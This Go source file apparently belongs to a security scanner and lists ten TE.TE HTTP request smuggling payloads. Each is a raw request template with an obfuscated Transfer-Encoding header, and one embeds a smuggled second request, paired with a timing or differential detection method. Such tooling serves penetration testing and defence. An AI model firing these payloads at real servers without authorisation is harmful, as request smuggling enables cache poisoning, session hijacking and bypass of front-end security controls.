package smuggling

// TE.TE Payloads — Both servers use Transfer-Encoding but with
// obfuscation. The attack uses malformed TE headers that one server
// ignores, falling back to Content-Length.
var tetePayloads = []Payload{
	{
		Type:        PayloadTETE,
		Name:        "tete-space-before-colon",
		Description: "TE.TE with space before colon",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding : chunked\r\n" +
			"\r\n" +
			"5c\r\n" +
			"GPOST / HTTP/1.1\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 15\r\n" +
			"\r\n" +
			"x=1\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "One server rejects malformed header, uses CL instead",
		DetectionMethod:  DetectTiming,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-tab-header",
		Description: "TE.TE with tab character in header",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding:\tchunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Tab character may be handled differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-line-folding",
		Description: "TE.TE with obsolete line folding",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			" smuggle\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Line folding may be handled differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-xchunked",
		Description: "TE.TE with Transfer-Encoding: xchunked",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: xchunked\r\n" +
			"\r\n" +
			"test",
		ExpectedBehavior: "xchunked may be accepted or rejected differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-null-byte",
		Description: "TE.TE with null byte in value",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\x00ignore\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Null byte may truncate value for some parsers",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-double-te",
		Description: "TE.TE with duplicate Transfer-Encoding headers",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked\r\n" +
			"Transfer-Encoding: identity\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Servers may use first or last TE header differently",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-mixed-case",
		Description: "TE.TE with mixed case encoding",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: ChUnKeD\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Mixed case may not be recognized",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-trailing-whitespace",
		Description: "TE.TE with trailing whitespace",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked \r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Trailing whitespace handling may differ",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-comma-separated",
		Description: "TE.TE with comma-separated encodings",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding: chunked, identity\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Comma handling may differ between servers",
		DetectionMethod:  DetectDifferential,
	},
	{
		Type:        PayloadTETE,
		Name:        "tete-newline-prefix",
		Description: "TE.TE with newline prefix in value",
		RequestTemplate: "POST {{PATH}} HTTP/1.1\r\n" +
			"Host: {{HOST}}\r\n" +
			"Content-Type: application/x-www-form-urlencoded\r\n" +
			"Content-Length: 4\r\n" +
			"Transfer-Encoding:\n chunked\r\n" +
			"\r\n" +
			"0\r\n" +
			"\r\n",
		ExpectedBehavior: "Newline in value may cause parsing issues",
		DetectionMethod:  DetectDifferential,
	},
}
